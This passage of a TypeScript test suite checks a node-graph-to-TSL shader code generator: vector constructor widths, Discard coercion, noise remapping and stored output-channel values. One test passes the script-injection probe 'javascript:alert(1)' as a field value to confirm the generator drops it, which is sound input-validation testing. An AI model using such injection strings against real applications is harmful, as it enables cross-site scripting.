    expect(code).not.toMatch(/const append1 = vec2\(/);
  });

  /** The emitted constructor and its argument list must always agree — a vecN
   *  handed more than N components is not valid TSL. */
  const componentsOf = (call: string): number => {
    const args = call.slice(call.indexOf('(') + 1, call.lastIndexOf(')')).split(',');
    return args.reduce((sum, a) => {
      const swizzle = /\.([xyzw]+)\s*$/.exec(a.trim());
      if (swizzle) return sum + swizzle[1].length;
      if (/vec4/.test(a)) return sum + 4;
      if (/vec3|positionGeometry|normalLocal/.test(a)) return sum + 3;
      if (/vec2|uv/.test(a)) return sum + 2;
      return sum + 1;
    }, 0);
  };

  it('grows to a 4th operand and emits vec4 for four floats', () => {
    const nodes = [
      ...['f1', 'f2', 'f3', 'f4'].map((n, i) => makeNode(n, 'float', { value: i })),
      makeNode('ap', 'append'),
      makeNode('out', 'output'),
    ];
    const edges = [
      ...['a', 'b', 'c', 'd'].map((h, i) => makeEdge(`f${i + 1}`, 'out', 'ap', h)),
      makeEdge('ap', 'out', 'out', 'color'),
    ];
    const { code } = graphToCode(nodes, edges);
    const line = code.split('\n').find((l) => l.includes('const append1 ='))!;
    expect(line).toMatch(/= vec4\(/);
    expect(componentsOf(line)).toBe(4);
  });

  it('truncates past 4 channels instead of overfilling the constructor', () => {
    // vec3 + vec3 = 6 channels. Previously emitted `vec4(posA, posB)` — a
    // 4-slot constructor handed 6 components.
    const p1 = makeNode('p1', 'positionGeometry');
    const p2 = makeNode('p2', 'positionGeometry');
    const ap = makeNode('ap', 'append');
    const out = makeNode('out', 'output');
    const { code } = graphToCode([p1, p2, ap, out], [
      makeEdge('p1', 'out', 'ap', 'a'),
      makeEdge('p2', 'out', 'ap', 'b'),
      makeEdge('ap', 'out', 'out', 'color'),
    ]);
    const line = code.split('\n').find((l) => l.includes('const append1 ='))!;
    expect(line).toMatch(/= vec4\(/);
    expect(componentsOf(line)).toBe(4);
    // The overflowing operand is swizzled down to the components that fit.
    expect(line).toMatch(/\.x\b/);
  });

  it('drops operands entirely once the vec4 is already full', () => {
    // uv + uv fills all 4 channels, so the third operand cannot appear.
    const nodes = [
      makeNode('u1', 'uv'),
      makeNode('u2', 'uv'),
      makeNode('f', 'float', { value: 9 }),
      makeNode('ap', 'append'),
      makeNode('out', 'output'),
    ];
    const { code } = graphToCode(nodes, [
      makeEdge('u1', 'out', 'ap', 'a'),
      makeEdge('u2', 'out', 'ap', 'b'),
      makeEdge('f', 'out', 'ap', 'c'),
      makeEdge('ap', 'out', 'out', 'color'),
    ]);
    const line = code.split('\n').find((l) => l.includes('const append1 ='))!;
    expect(line).toMatch(/= vec4\(/);
    expect(componentsOf(line)).toBe(4);
    expect(line).not.toMatch(/float1/);
  });

  // ===== Widths come from the SOURCE HANDLE, never from the source node =====
  // The argument TEXT has always been built by the handle-aware
  // `resolveEdgeRef`; the channel COUNTS beside it used to come from a
  // per-NODE lookup. Every source whose non-head output narrows — `toHsl`
  // (vec3 `out` plus float `h`/`s`/`l`, emitted as .x/.y/.z swizzles of ONE
  // call) and `dataviz` (out:vec3 + value:float) — therefore desynchronised
  // the constructor from its own arguments.

  /** The width the emitted constructor NAME claims: vec2/vec3/vec4 → 2/3/4. */
  const ctorWidth = (call: string): number => Number(/= vec([234])\(/.exec(call)![1]);

  const appendLineOf = (nodes: ReturnType<typeof makeNode>[], edges: ReturnType<typeof makeEdge>[]) =>
    graphToCode(nodes, edges).code.split('\n').find((l) => l.includes('const append1 ='))!;

  /** color → toHsl → append, with each [sourceHandle, appendPort] wired. */
  const toHslAppend = (wires: [string, string][], extra: ReturnType<typeof makeEdge>[] = [], extraNodes: ReturnType<typeof makeNode>[] = []) =>
    appendLineOf(
      [
        makeNode('c', 'color', { hex: '#ff8800' }),
        makeNode('th', 'toHsl'),
        ...extraNodes,
        makeNode('ap', 'append'),
        makeNode('out', 'output'),
      ],
      [
        makeEdge('c', 'out', 'th', 'rgb'),
        ...wires.map(([h, p]) => makeEdge('th', h, 'ap', p)),
        ...extra,
        makeEdge('ap', 'out', 'out', 'color'),
      ],
    );

  it('sizes the constructor from a narrow source HANDLE, not the source node', () => {
    // `toHsl.h` is a float. Counting per node reported 3 for it, so this
    // emitted `vec4(toHsl1.x, float1)` — a four-slot constructor handed two
    // components, which is not valid TSL: the whole module failed to compile.
    const line = toHslAppend(
      [['h', 'a']],
      [makeEdge('f', 'out', 'ap', 'b')],
      [makeNode('f', 'float', { value: 3 })],
    );
    expect(line).toContain('const append1 = vec2(toHsl1.x, float1);');
    expect(ctorWidth(line)).toBe(2);
    expect(componentsOf(line)).toBe(ctorWidth(line));
  });

  it('keeps all three h/s/l operands instead of folding two into a double swizzle', () => {
    // Previously `vec4(toHsl1.x, toHsl1.y.x)`: three per-node "3"s filled the
    // vec4 after two operands, so the Lightness wire was dropped ENTIRELY and
    // the survivor got `.x` applied to a float.
    const line = toHslAppend([['h', 'a'], ['s', 'b'], ['l', 'c']]);
    expect(line).toContain('const append1 = vec3(toHsl1.x, toHsl1.y, toHsl1.z);');
    for (const swizzle of ['toHsl1.x', 'toHsl1.y', 'toHsl1.z']) {
      expect(line).toContain(swizzle);
    }
    // A swizzle of a swizzle is the signature of the old handle-blind trim.
    expect(line).not.toMatch(/\.[xyzw]+\.[xyzw]+/);
    expect(componentsOf(line)).toBe(3);
  });

  it('reads a dataviz `value` socket as one channel, not the node vec3', () => {
    // `dataviz` is the second node with a narrow non-head output. It needs no
    // upstream Data node to emit — an unwired signal falls back to `uv().x` —
    // so pinning it here costs no setup and no fixture.
    const line = appendLineOf(
      [
        makeNode('dv', 'dataviz'),
        makeNode('f', 'float', { value: 3 }),
        makeNode('ap', 'append'),
        makeNode('out', 'output'),
      ],
      [
        makeEdge('dv', 'value', 'ap', 'a'),
        makeEdge('f', 'out', 'ap', 'b'),
        makeEdge('ap', 'out', 'out', 'color'),
      ],
    );
    expect(ctorWidth(line)).toBe(2);
    expect(line).not.toMatch(/vec4\(/);
    expect(componentsOf(line)).toBe(2);
  });

  // The whole defect class in one assertion: a vecN handed anything other than
  // N components is never valid TSL, however the operands were counted.
  it('never emits a vecN handed anything but N components', () => {
    const f = (n: string, v: number) => makeNode(n, 'float', { value: v });
    const toAp = (src: string, handle: string, port: string) => makeEdge(src, handle, 'ap', port);
    const ap = makeNode('ap', 'append');
    const out = makeNode('out', 'output');
    const sink = makeEdge('ap', 'out', 'out', 'color');

    const cases: Array<[string, ReturnType<typeof makeNode>[], ReturnType<typeof makeEdge>[]]> = [
      // One wired float and one unwired operand — the `0` still spends a channel.
      ['float + unwired', [f('f1', 1), ap, out], [toAp('f1', 'out', 'a'), sink]],
      ['float + float', [f('f1', 1), f('f2', 2), ap, out],
        [toAp('f1', 'out', 'a'), toAp('f2', 'out', 'b'), sink]],
      ['vec2 + float', [makeNode('v2', 'vec2', { x: 1, y: 2 }), f('f1', 3), ap, out],
        [toAp('v2', 'out', 'a'), toAp('f1', 'out', 'b'), sink]],
      // A split swizzle is a float reached through a vec3 node — the same
      // handle-vs-node split as toHsl, by a different mechanism (it inlines
      // as `<sourceVar>.y` with no variable of its own).
      ['split.y + float', [makeNode('v', 'vec3', { x: 1, y: 2, z: 3 }), makeNode('s', 'split'), f('f1', 3), ap, out],
        [makeEdge('v', 'out', 's', 'v'), toAp('s', 'y', 'a'), toAp('f1', 'out', 'b'), sink]],
      ['toHsl.h + toHsl.l', [makeNode('c', 'color', { hex: '#ff8800' }), makeNode('th', 'toHsl'), ap, out],
        [makeEdge('c', 'out', 'th', 'rgb'), toAp('th', 'h', 'a'), toAp('th', 'l', 'b'), sink]],
      ['dataviz.value + vec2', [makeNode('dv', 'dataviz'), makeNode('v2', 'vec2', { x: 1, y: 2 }), ap, out],
        [toAp('dv', 'value', 'a'), toAp('v2', 'out', 'b'), sink]],
      ['four floats', [f('f1', 1), f('f2', 2), f('f3', 3), f('f4', 4), ap, out],
        [toAp('f1', 'out', 'a'), toAp('f2', 'out', 'b'), toAp('f3', 'out', 'c'), toAp('f4', 'out', 'd'), sink]],
      // The two over-capacity forms the trim tests above cover, re-checked
      // through the same invariant.
      ['vec3 + vec3 (trimmed)', [makeNode('p1', 'positionGeometry'), makeNode('p2', 'positionGeometry'), ap, out],
        [toAp('p1', 'out', 'a'), toAp('p2', 'out', 'b'), sink]],
      ['uv + uv + float (dropped)', [makeNode('u1', 'uv'), makeNode('u2', 'uv'), f('f1', 9), ap, out],
        [toAp('u1', 'out', 'a'), toAp('u2', 'out', 'b'), toAp('f1', 'out', 'c'), sink]],
    ];

    for (const [name, nodes, edges] of cases) {
      const line = appendLineOf(nodes, edges);
      expect(componentsOf(line), `${name}: ${line.trim()}`).toBe(ctorWidth(line));
    }
  });
});

describe('graphToCode — output shape', () => {
  it('produces a self-contained module with Fn wrapper and default export', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([c, out], [makeEdge('c', 'out', 'out', 'color')]);
    expect(code).toMatch(/const shader = Fn\(\(\) => \{/);
    expect(code).toMatch(/\}\);\s+export default shader;/);
  });
});

describe('graphToCode — Discard condition shape', () => {
  // The condition compiles to `bool(<ref>)`, and three widens a non-1-channel
  // FLOAT to `all( <vecN> )` — declared only over bvecN (GLSL ES 3.00) /
  // vecN<bool> (WGSL). Measured in a real WebGL2 context:
  // "ERROR: 'all' : no matching overloaded function found", i.e. the fragment
  // program fails to link and the mesh vanishes at every value, silently.
  const out = () => makeNode('out', 'output');

  it('leaves a scalar source byte-identical (no churn for existing shaders)', () => {
    const { code } = graphToCode(
      [makeNode('f', 'float', { value: 0 }), out()],
      [makeEdge('f', 'out', 'out', 'discard')],
    );
    expect(code).toContain('Discard(float1);');
  });

  it('takes .x from a vec3 source instead of emitting an uncompilable all()', () => {
    const { code } = graphToCode(
      [makeNode('c', 'color', { hex: '#ff8800' }), out()],
      [makeEdge('c', 'out', 'out', 'discard')],
    );
    expect(code).toContain('Discard(color1.x);');
  });

  it('coerces a vec3-shaped noise source too', () => {
    const { code } = graphToCode(
      [makeNode('n', 'perlinVec3'), out()],
      [makeEdge('n', 'out', 'out', 'discard')],
    );
    expect(code).toMatch(/Discard\(\w+\.x\);/);
  });

  // A logic node's vector output really IS a bvecN: `all( greaterThan(a, b) )`
  // is valid AND means "every channel passed". Narrowing it to .x would
  // silently change the test.
  it('never coerces a logic source, whatever its shape', () => {
    const { code } = graphToCode(
      [
        makeNode('a', 'color', { hex: '#ff0000' }),
        makeNode('b', 'color', { hex: '#808080' }),
        makeNode('g', 'greaterThan'),
        out(),
      ],
      [
        makeEdge('a', 'out', 'g', 'a'),
        makeEdge('b', 'out', 'g', 'b'),
        makeEdge('g', 'out', 'out', 'discard'),
      ],
    );
    expect(code).toContain('Discard(greaterThan1);');
    expect(code).not.toContain('greaterThan1.x');
  });
});

describe('graphToCode — noise range flag', () => {
  const NOISE_TYPES = [
    'perlin', 'perlinVec3', 'fbm', 'fbmVec3',
    'cellNoise', 'voronoi', 'voronoiVec2', 'voronoiVec3',
  ] as const;
  const emit = (type: string, values: Record<string, unknown>) =>
    graphToCode(
      [makeNode('n', type, values as never), makeNode('out', 'output')],
      [makeEdge('n', 'out', 'out', 'color')],
    ).code;

  // THE test for the hard constraint. Every graph saved before this flag
  // existed, every noise member of the built-in textures and presets, and every
  // re-imported .js must emit the byte-identical line it emitted before.
  it('emits byte-identically for an absent or junk flag, on every noise type', () => {
    const junk = [
      undefined, null, '', ' ', 'false', 'true', true, 1, '1',
      [], [0], {}, NaN, Infinity, 0.4, '0.0',
    ];
    for (const type of NOISE_TYPES) {
      const baseline = emit(type, { pos: 'positionGeometry', scale: 1 });
      expect(baseline, type).not.toContain('.mul(0.5).add(0.5)');
      for (const v of junk) {
        expect(emit(type, { pos: 'positionGeometry', scale: 1, signed: v }), `${type} / ${String(v)}`)
          .toBe(baseline);
      }
    }
  });

  it('appends the 0-1 remap only for the four signed types', () => {
    for (const type of NOISE_TYPES) {
      const code = emit(type, { pos: 'positionGeometry', scale: 1, signed: 0 });
      const expected = ['perlin', 'perlinVec3', 'fbm', 'fbmVec3'].includes(type);
      expect(code.includes('.mul(0.5).add(0.5)'), type).toBe(expected);
    }
  });

  it('wraps the FINISHED call, so scale keeps rescaling the coordinate', () => {
    // Appending to posExpr instead would scale the input, not the output.
    expect(emit('perlin', { pos: 'positionGeometry', scale: 4, signed: 0 }))
      .toContain('const noise1 = mx_noise_float(positionGeometry.mul(4)).mul(0.5).add(0.5);');
  });

  it('needs no new import — the remap is a method chain', () => {
    const code = emit('perlin', { pos: 'positionGeometry', scale: 1, signed: 0 });
    const imports = code.split('\n')[0];
    expect(imports).not.toContain(' mul');
    expect(imports).not.toContain(' add');
  });
});

describe('graphToCode — environment + metalness channels', () => {
  const IMG = {
    imageB64: `data:image/webp;base64,${btoa('abc')}`,
    width: 2,
    height: 2,
    fileName: 'forest.webp',
    colorSpace: 'color',
  };

  it('emits the image TEXTURE for env — never the sampled vec3', () => {
    const img = makeNode('img', 'imageNode', IMG);
    const color = makeNode('c', 'color', { hex: '#112233' });
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('c', 'out', 'out', 'color'),
      makeEdge('img', 'out', 'out', 'env'),
    ];
    const { code } = graphToCode([img, color, out], edges);
    // The module-scope texture var, not the Fn-body `texture(tex, uv).rgb` sample.
    expect(code).toContain('env: texture(_image1_tex)');
    expect(code).not.toContain('env: image1');
    // The referenced var really is declared (an undeclared ref would be a
    // ReferenceError that kills the whole module at import time).
    expect(code).toContain('const _image1_tex =');
  });

  it('falls back to the plain (inert vec3) ref when the image payload is invalid', () => {
    const img = makeNode('img', 'imageNode', { ...IMG, imageB64: '' });
    const out = makeNode('out', 'output');
    const color = makeNode('c', 'color', { hex: '#112233' });
    const edges = [
      makeEdge('c', 'out', 'out', 'color'),
      makeEdge('img', 'out', 'out', 'env'),
    ];
    const { code } = graphToCode([img, color, out], edges);
    // No texture var exists on the fallback path — referencing it would crash.
    expect(code).not.toContain('_image1_tex');
    expect(code).toContain('const image1 = vec3(0, 0, 0);');
    expect(code).toContain('env: image1');
  });

  it('passes a vec3-shaped non-image source through raw (constant ambient env)', () => {
    const c = makeNode('c', 'color', { hex: '#334455' });
    const c2 = makeNode('c2', 'color', { hex: '#112233' });
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('c2', 'out', 'out', 'color'),
      makeEdge('c', 'out', 'out', 'env'),
    ];
    const { code } = graphToCode([c, c2, out], edges);
    expect(code).toContain('env: color1');
  });

  it('widens a scalar env source to vec3', () => {
    const f = makeNode('f', 'float', { value: 0.5 });
    const c = makeNode('c', 'color', { hex: '#112233' });
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('c', 'out', 'out', 'color'),
      makeEdge('f', 'out', 'out', 'env'),
    ];
    const { code } = graphToCode([f, c, out], edges);
    expect(code).toContain('env: vec3(float1)');
  });

  it('emits metalness through the generic channel path', () => {
    const f = makeNode('f', 'float', { value: 0.9 });
    const c = makeNode('c', 'color', { hex: '#112233' });
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('c', 'out', 'out', 'color'),
      makeEdge('f', 'out', 'out', 'metalness'),
    ];
    const { code } = graphToCode([f, c, out], edges);
    expect(code).toContain('metalness: float1');
  });
});

describe('graphToCode — Output node stored channel values', () => {
  it('emits float()/color() wrappers for stored values on exposed channels', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = makeNode('out', 'output', { roughness: 0.35, emissive: '#112233' });
    (out.data as { exposedPorts?: string[] }).exposedPorts = [
      'color', 'emissive', 'roughness', 'position',
    ];
    const edges = [makeEdge('c', 'out', 'out', 'color')];
    const { code } = graphToCode([c, out], edges);
    expect(code).toContain('roughness: float(0.35)');
    expect(code).toContain('emissive: color(0x112233)');
    expect(code).toMatch(/import \{[^}]*\bfloat\b[^}]*\} from 'three\/tsl';/);
  });

  it('emits a bare color() return for a stored color with nothing else', () => {
    const out = makeNode('out', 'output', { color: '#112233' });
    const { code } = graphToCode([out], []);
    expect(code).toContain('return color(0x112233);');
  });

  it('a wired edge always beats the stored value', () => {
    const f = makeNode('f', 'float', { value: 0.5 });
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = makeNode('out', 'output', { roughness: 0.9 });
    const edges = [
      makeEdge('c', 'out', 'out', 'color'),
      makeEdge('f', 'out', 'out', 'roughness'),
    ];
    const { code } = graphToCode([f, c, out], edges);
    expect(code).toContain('roughness: float1');
    expect(code).not.toContain('float(0.9)');
  });

  it('suppresses values on hidden channels — what the node shows is what emits', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    // metalness valued but NOT exposed (implicit defaults lack it)
    const out = makeNode('out', 'output', { metalness: 0.9 });
    const edges = [makeEdge('c', 'out', 'out', 'color')];
    const { code } = graphToCode([c, out], edges);
    expect(code).not.toContain('metalness');
  });

  it('skips garbage values instead of emitting them', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = makeNode('out', 'output', {
      roughness: 'abc',
      emissive: 'javascript:alert(1)',
    });
    (out.data as { exposedPorts?: string[] }).exposedPorts = [
      'color', 'emissive', 'roughness', 'position',
    ];
    const edges = [makeEdge('c', 'out', 'out', 'color')];
    const { code } = graphToCode([c, out], edges);
    expect(code).not.toContain('roughness');
    expect(code).not.toContain('emissive');
    expect(code).toContain('return color1;');
  });

  it('absent values keep the historical emission byte-identical', () => {
    const c = makeNode('c', 'color', { hex: '#00ff00' });
    const f = makeNode('f', 'float', { value: 0.5 });
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('c', 'out', 'out', 'color'),
      makeEdge('f', 'out', 'out', 'opacity'),
    ];
    const { code } = graphToCode([c, f, out], edges);
    expect(code).toMatch(/return \{ color: color1, opacity: float1 \};/);
  });
});

describe('graphToCode — the wider stored-value channel set', () => {
  const exposeAll = (out: ReturnType<typeof makeNode>) => {
    (out.data as { exposedPorts?: string[] }).exposedPorts = [
      'color', 'emissive', 'roughness', 'metalness', 'opacity', 'discard', 'normal', 'env', 'position',
    ];
    return out;
  };

  it('emits a DECODED normal-map texel for stored normal, plain color() for env', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = exposeAll(makeNode('out', 'output', { normal: '#112233', env: '#445566' }));
    const { code } = graphToCode([c, out], [makeEdge('c', 'out', 'out', 'color')]);
    // normalMap() does the [0,1]->[-1,1] remap + TBN transform — a raw
    // color() fed to normalNode would be an unnormalized sheared vector.
    expect(code).toContain('normal: normalMap(color(0x112233))');
    expect(code).toContain('env: color(0x445566)');
  });

  it('the DEFAULT normal color #8080ff emits nothing (identity override)', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = exposeAll(makeNode('out', 'output', { normal: '#8080ff' }));
    const { code } = graphToCode([c, out], [makeEdge('c', 'out', 'out', 'color')]);
    expect(code).not.toContain('normal');
  });

  it('emits float() for a stored displacement, skipping zero (a no-op)', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = exposeAll(makeNode('out', 'output', { position: 0.2 }));
    const { code } = graphToCode([c, out], [makeEdge('c', 'out', 'out', 'color')]);
    expect(code).toContain('position: float(0.2)');
    const zero = exposeAll(makeNode('out2', 'output', { position: 0 }));
    const { code: code0 } = graphToCode([c, zero], [makeEdge('c', 'out2', 'out', 'color')]);
    expect(code0).not.toContain('position:');
  });

  it('emits Discard(float(v)) for a non-zero stored discard, nothing for zero', () => {
    const c = makeNode('c', 'color', { hex: '#ff0000' });
    const out = exposeAll(makeNode('out', 'output', { discard: 0.5 }));
    const { code } = graphToCode([c, out], [makeEdge('c', 'out', 'out', 'color')]);
    expect(code).toContain('Discard(float(0.5));');
    const zero = exposeAll(makeNode('out2', 'output', { discard: 0 }));
    const { code: code0 } = graphToCode([c, zero], [makeEdge('c', 'out2', 'out', 'color')]);
    expect(code0).not.toContain('Discard');
  });
});
